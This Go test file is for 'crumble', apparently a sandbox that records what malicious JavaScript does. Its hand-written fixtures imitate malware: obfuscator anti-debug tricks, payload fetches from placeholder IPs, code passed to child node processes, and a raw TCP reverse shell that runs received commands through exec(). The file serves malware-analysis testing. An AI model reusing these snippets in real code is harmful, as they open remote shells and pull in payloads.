package sandbox

import (
	"strings"
	"testing"
	"time"
)

// Patterns seen while running crumble over MalwareBazaar samples. Every
// fixture here is written by hand with the same shape; none is sample code.

// javascript-obfuscator's self-defending code runs "(((.+)+)+)+$" over a
// function's own source. On reformatted code that regex backtracks for
// hours, inside the regex engine where the budget can't interrupt it.
func TestSelfDefendingRegexOnReformattedCode(t *testing.T) {
	src := `
		const guard = function () {
			return guard
				.toString()
				.search("(((.+)+)+)+$")
				.toString()
				.constructor(guard)
				.search("(((.+)+)+)+$");
		};
		guard();
		require("axios").get("http://203.0.113.30:1224/pdown");
	`
	start := time.Now()
	tr := run(t, src, Options{Budget: 5 * time.Second})
	if d := time.Since(start); d > 4*time.Second {
		t.Errorf("run took %v", d)
	}
	if reqs := tr.Of("http.request"); len(reqs) != 1 {
		t.Fatalf("request after the guard not reached: %+v (error %q)", reqs, tr.Error)
	}
}

func TestFunctionConstructorReachedIndirectly(t *testing.T) {
	tr := run(t, `
		const errCode = "return require('os').platform()";
		const handler = new (Function.constructor)("require", errCode);
		handler(require);
		(function () {}).constructor("return 2")();
		[].constructor.constructor("return 3")();
		(async function () {}).constructor("return 4");
		(function* () {}).constructor("yield 5");
	`, Options{})
	got := map[string]int{}
	for _, s := range tr.Stages {
		got[s.Via]++
	}
	if got["Function"] != 3 || got["AsyncFunction"] != 1 || got["GeneratorFunction"] != 1 {
		t.Errorf("stages by route = %v", got)
	}
	if tr.Stages[0].Code != "return require('os').platform()" {
		t.Errorf("first stage = %q", tr.Stages[0].Code)
	}
}

// Debug protection recurses through Function("debugger") with no base case
// and relies on Node's catchable stack overflow to stop. It also builds the
// global-object helper with Function, which is not a stage either.
func TestDebugProtection(t *testing.T) {
	tr := run(t, `
		const root = Function('return (function() {}.constructor("return this")( ));')();
		function dbg(ret) {
			function step(i) {
				if (typeof i === "string") {
					return function () {}.constructor("while (true) {}").apply("counter");
				} else if (("" + i / i).length !== 1 || i % 20 === 0) {
					(function () { return true; }).constructor("debu" + "gger").call("action");
				} else {
					(function () { return false; }).constructor("debu" + "gger").apply("stateObject");
				}
				step(++i);
			}
			try {
				if (ret) return step;
				step(0);
			} catch (e) {}
		}
		dbg();
		setInterval(function () { dbg(); }, 4000);
		require("axios").post("http://203.0.113.31:8087/api/log", {});
	`, Options{Budget: 5 * time.Second})
	if len(tr.Stages) != 0 {
		t.Errorf("stages = %+v, want none", tr.Stages)
	}
	if len(tr.Of("antidebug")) != 1 {
		t.Errorf("antidebug events = %d, want 1", len(tr.Of("antidebug")))
	}
	if len(tr.Of("http.request")) != 1 || tr.Error != "" {
		t.Errorf("sample did not get past debug protection: error %q", tr.Error)
	}
}

func TestRepeatedStageIsCounted(t *testing.T) {
	tr := run(t, `for (let i = 0; i < 50; i++) eval("1 + 1");`, Options{})
	if len(tr.Stages) != 1 || tr.Stages[0].Count != 50 || len(tr.Of("stage")) != 1 {
		t.Errorf("stages = %+v, stage events = %d", tr.Stages, len(tr.Of("stage")))
	}
}

// The current OtterCookie loader starts each module as `node -` and writes
// the source to the child's stdin; older builds pass it with -e.
func TestCodeHandedToChildNode(t *testing.T) {
	tr := run(t, `
		const { spawn } = require("child_process");
		const child = spawn(process.execPath, ["--no-warnings", "-"], { detached: true, stdio: ["pipe", "ignore", "ignore"] });
		child.stdin.write("const io = require('socket.io-client');\n");
		child.stdin.end("io('ws://203.0.113.32:8087');");
		spawn("node", ["-e", "require('axios').get('http://203.0.113.33/e')"]);
		spawn("python3", ["-"]).stdin.end("print('not node')");
	`, Options{})
	var vias []string
	for _, s := range tr.Stages {
		vias = append(vias, s.Via)
	}
	if strings.Join(vias, ",") != "node stdin,node -e" {
		t.Errorf("stages = %v", vias)
	}
	if c := tr.Of("socketio.connect"); len(c) != 1 || c[0].Data["url"] != "ws://203.0.113.32:8087" {
		t.Errorf("stdin module never ran: %+v", c)
	}
	if reqs := tr.Of("http.request"); len(reqs) != 1 || reqs[0].Data["url"] != "http://203.0.113.33/e" {
		t.Errorf("-e module never ran: %+v", reqs)
	}
}

func TestRawTCPShellProbe(t *testing.T) {
	tr := run(t, `
		const net = require("net");
		const { exec } = require("child_process");
		const s = new net.Socket();
		s.setTimeout(360000);
		s.setKeepAlive(true, 60000);
		s.on("connect", () => s.write(JSON.stringify({ status: "connected", message: "hi" }) + "\n"));
		s.on("data", (d) => exec(d.toString().trim(), () => {}));
		s.connect(15152, "203.0.113.34");
	`, Options{Probe: true})
	if c := tr.Of("net.connect"); len(c) != 1 || c[0].Data["target"] != "203.0.113.34:15152" {
		t.Fatalf("net.connect = %+v", c)
	}
	if w := tr.Of("net.write"); len(w) != 1 || !strings.Contains(w[0].Data["data"].(string), `"status":"connected"`) {
		t.Errorf("net.write = %+v", w)
	}
	ex := tr.Of("exec")
	if len(ex) != 1 || ex[0].Data["command"] != "echo crumble-probe:data" {
		t.Errorf("exec = %+v", ex)
	}
}

func TestStubbedFreeVariables(t *testing.T) {
	tr := run(t, `
		module.exports = router;
		require("axios").get("http://203.0.113.35:1244/keys");
	`, Options{Stubs: []string{"router"}})
	if tr.Error != "" || len(tr.Of("http.request")) != 1 {
		t.Errorf("error %q, requests %d", tr.Error, len(tr.Of("http.request")))
	}
}
